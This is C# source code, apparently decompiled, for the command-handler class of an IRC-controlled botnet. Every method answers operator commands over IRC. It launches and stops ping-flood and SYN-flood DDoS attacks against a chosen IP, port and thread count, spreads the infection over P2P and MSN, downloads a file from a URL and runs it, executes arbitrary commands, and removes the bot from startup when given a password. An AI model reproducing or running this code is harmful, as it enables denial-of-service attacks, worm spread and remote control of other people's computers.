using System.Diagnostics;
using System.Threading;
using spreading;

namespace explorer;

internal class basecommandlist : commandlist
{
	public override void p2p(irc irc)
	{
		try
		{
			P2P.Start();
			irc.teller.tell(config.channel, "Spreading-P2P", config.language_spreading_p2p_success, iserror: false, isinformation: true, iswarning: false);
		}
		catch
		{
			irc.teller.tell(config.channel, "Spreading-P2P", config.language_spreading_p2p_error, iserror: true, isinformation: false, iswarning: false);
		}
	}

	public override void pingstop(irc irc)
	{
		if (Ping.running)
		{
			Ping.stop();
			irc.teller.tell(config.channel, "DDoS", config.language_ping_stopped.Replace("%ip%", Ping.ip).Replace("%threads%", Ping.threads.ToString()), iserror: false, isinformation: true, iswarning: false);
		}
		else
		{
			irc.teller.tell(config.channel, "DDoS", config.language_ping_notrunning, iserror: false, isinformation: false, iswarning: true);
		}
	}

	public override void ping(irc irc, string message)
	{
		if (message.Contains(" "))
		{
			string[] array = message.Split(new char[1] { ' ' });
			if (array.Length == 2)
			{
				if (Ping.running)
				{
					irc.teller.tell(config.channel, "DDoS", config.language_ping_already.Replace("%ip%", Ping.ip).Replace("%threads%", Ping.threads.ToString()), iserror: false, isinformation: false, iswarning: true);
					return;
				}
				Ping.ip = array[0];
				Ping.threads = int.Parse(array[1]);
				Ping.start();
				irc.teller.tell(config.channel, "DDoS", config.language_ping_success.Replace("%ip%", Ping.ip).Replace("%threads%", Ping.threads.ToString()), iserror: false, isinformation: true, iswarning: false);
			}
			else
			{
				irc.teller.tell(config.channel, "DDoS", config.language_ping_error, iserror: true, isinformation: false, iswarning: false);
			}
		}
		else
		{
			irc.teller.tell(config.channel, "DDoS", config.language_ping_error, iserror: true, isinformation: false, iswarning: false);
		}
	}

	public override void ssynstop(irc irc)
	{
		if (syn.IsEnabled)
		{
			irc.teller.tell(config.channel, "SSYN", config.language_ssyn_stopped.Replace("%ip%", syn.Host).Replace("%port%", syn.Port.ToString()).Replace("%threads%", syn.Threads.ToString())
				.Replace("%sockets%", syn.SuperSynSockets.ToString()), iserror: false, isinformation: true, iswarning: false);
			syn.StopSuperSyn();
			syn.IsEnabled = false;
		}
		else
		{
			irc.teller.tell(config.channel, "SSYN", config.language_ssyn_notrunning, iserror: false, isinformation: false, iswarning: true);
		}
	}

	public override void ssyn(irc irc, string message)
	{
		if (message.Contains(" "))
		{
			string[] array = message.Split(new char[1] { ' ' });
			if (array.Length == 4)
			{
				if (!syn.IsEnabled)
				{
					syn.Host = array[0];
					syn.Port = int.Parse(array[1]);
					syn.SuperSynSockets = int.Parse(array[2]);
					syn.Threads = int.Parse(array[3]);
					syn.StartSuperSyn();
					syn.IsEnabled = true;
					irc.teller.tell(config.channel, "SSYN", config.language_ssyn_success.Replace("%ip%", syn.Host).Replace("%port%", syn.Port.ToString()).Replace("%threads%", syn.Threads.ToString())
						.Replace("%sockets%", syn.SuperSynSockets.ToString()), iserror: false, isinformation: true, iswarning: false);
				}
				else
				{
					irc.teller.tell(config.channel, "SSYN", config.language_ssyn_allready.Replace("%ip%", syn.Host).Replace("%port%", syn.Port.ToString()).Replace("%threads%", syn.Threads.ToString())
						.Replace("%sockets%", syn.SuperSynSockets.ToString()), iserror: false, isinformation: false, iswarning: true);
				}
			}
			else
			{
				irc.teller.tell(config.channel, "SSYN", config.language_ssyn_noparms, iserror: false, isinformation: false, iswarning: true);
			}
		}
		else
		{
			irc.teller.tell(config.channel, "SSYN", config.language_ssyn_noparms, iserror: false, isinformation: false, iswarning: true);
		}
	}

	public override void msnstop(irc irc)
	{
		if (storage.msn_spreading != null)
		{
			irc.teller.tell(config.channel, "Spreading-MSN", config.language_spreading_msn_stopped_success, iserror: false, isinformation: true, iswarning: false);
			try
			{
				storage.msn_spreading.Suspend();
				storage.msn_spreading = null;
				return;
			}
			catch
			{
				return;
			}
		}
		irc.teller.tell(config.channel, "Spreading-MSN", config.language_spreading_msn_stopped_allready, iserror: false, isinformation: false, iswarning: true);
	}

	public override void msnstart(irc irc, string message)
	{
		msn msn = new msn();
		msn.spread(message, irc, config.channel);
	}

	public override void version(irc irc, string user)
	{
		irc.sendPrivmsg(config.channel, config.version_message.Replace("%name%", config.name).Replace("%version%", config.version).Replace("%user%", user));
	}

	public override void remove(irc irc, string pass, string user)
	{
		if (pass == config.cmd_remove_pass)
		{
			misc.setInfected(config.infecting_startup_name, config.infecting_startup_pathexe, value: false);
			misc.batRemove("OWNAGE.bat", config.infecting_startup_pathexe);
			irc.teller.tell(config.channel, "Remover", config.language_remove_success.Replace("%user%", user), iserror: false, isinformation: true, iswarning: false);
			exit(config.language_remove_quit.Replace("%user%", user), irc);
		}
		else
		{
			irc.teller.tell(config.channel, "Remover", config.language_remove_password_error, iserror: true, isinformation: false, iswarning: false);
		}
	}

	public override void download(irc irc, string parms, string nick)
	{
		if (parms.Contains(" "))
		{
			string[] array = parms.Split(new char[1] { ' ' });
			if (array.Length == 3)
			{
				if (misc.download(array[0], array[1], irc))
				{
					if (array[2] == "1")
					{
						irc.teller.tell(config.channel, "Download", config.language_download_success_run.Replace("%user%", nick).Replace("%url%", array[0]).Replace("%loc%", array[1])
							.Replace("%exe%", array[2]), iserror: false, isinformation: true, iswarning: false);
						misc.exec(array[1], irc);
					}
					else
					{
						irc.teller.tell(config.channel, "Download", config.language_download_success_norun.Replace("%user%", nick).Replace("%url%", array[0]), iserror: false, isinformation: true, iswarning: false);
					}
				}
			}
			else
			{
				irc.teller.tell(config.channel, "Download", config.language_download_error_noparms.Replace("%user%", nick), iserror: false, isinformation: false, iswarning: true);
			}
		}
		else
		{
			irc.teller.tell(config.channel, "Download", config.language_download_error_noparms.Replace("%user%", nick), iserror: false, isinformation: false, iswarning: true);
		}
	}

	public override void exec(irc irc, string parms)
	{
		misc.exec(parms, irc);
	}

	public override void about(irc irc, string channel)
	{
		string text = "\u0003" + config.about_forecolor + "," + config.about_backcolor;
		string text2 = "\u0003" + config.about_fontcolor + "," + config.about_backcolor;
		string text3 = "";
		string text4 = text + config.about_side_char;
		string text5 = text + config.about_side_char + text2;
		string text6 = text + config.about_side_char;
		string text7 = text4 + config.about_top_close + text6 + "\n";
		string text8 = text4 + config.about_top_close + text6;
		string text9 = text5 + misc.multipleChar(config.about_back_char, config.about_top_close.Length) + text6 + "\n";
		string text10 = text5 + misc.centerString(config.about_back_char, config.about_name.Replace("%version%", config.version).Replace("%name%", config.name), config.about_top_close.Length) + text6 + "\n";
		string text11 = text5 + misc.formatString(config.about_back_char + config.about_back_char, config.about_madeby, config.about_back_char, config.about_top_close.Length + 3).Replace("%emiel%", config.about_emiel).Replace("%dion%", config.about_dion) + text6 + "\n";
		text3 += text7;
		text3 += text9;
		text3 += text10;
		text3 += text9;
		text3 += text11;
		if (config.about_ismod)
		{
			text3 += text9;
			string text12 = text3;
			text3 = text12 + text5 + misc.formatString(config.about_back_char + config.about_back_char, config.about_modby, config.about_back_char, config.about_top_close.Length) + text6 + "\n";
			string text13 = text3;
			text3 = text13 + text5 + misc.formatString(config.about_back_char + config.about_back_char, config.about_ismodby, config.about_back_char, config.about_top_close.Length) + text6 + "\n";
		}
		text3 += text9;
		text3 += text8;
		string[] array = text3.Split(new char[1] { '\n' });
		string[] array2 = array;
		foreach (string message in array2)
		{
			irc.sendPrivmsg(channel, message);
		}
	}

	public override void say(string msg, irc irc)
	{
		irc.sendPrivmsg(config.channel, msg);
	}

	public override void exit(irc irc)
	{
		irc.sendQuit();
		Thread.Sleep(1000);
		Process.GetCurrentProcess().Kill();
	}

	public override void exit(string reason, irc irc)
	{
		irc.sendQuit(reason);
		Thread.Sleep(1000);
		Process.GetCurrentProcess().Kill();
	}
}
